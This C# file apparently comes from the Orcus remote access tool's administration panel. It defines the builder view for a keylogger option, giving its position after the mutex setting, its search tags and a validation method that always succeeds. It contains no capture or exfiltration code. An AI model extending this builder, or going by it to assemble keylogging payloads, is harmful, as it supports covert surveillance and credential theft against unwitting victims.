using System.Collections.Generic;
using Orcus.Administration.Plugins.BuildPlugin;
using Orcus.Plugins.Builder;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;

namespace Orcus.Administration.Views.BuilderViews
{
    /// <summary>
    ///     Interaction logic for KeyloggerBuilderPropertyView.xaml
    /// </summary>
    public partial class KeyloggerBuilderPropertyView : BuilderPropertyViewUserControl<KeyloggerBuilderProperty>
    {
        public KeyloggerBuilderPropertyView()
        {
            InitializeComponent();
        }

        public override BuilderPropertyPosition PropertyPosition { get; } =
            BuilderPropertyPosition.FromCategory(BuilderCategory.GeneralSettings).ComesAfter<MutexBuilderProperty>();

        public override string[] Tags { get; } = {"keylogger", "keys", "tasten"};

        public override InputValidationResult ValidateInput(List<IBuilderProperty> currentBuilderProperties,
            KeyloggerBuilderProperty currentBuilderProperty)
        {
            return InputValidationResult.Successful;
        }
    }
}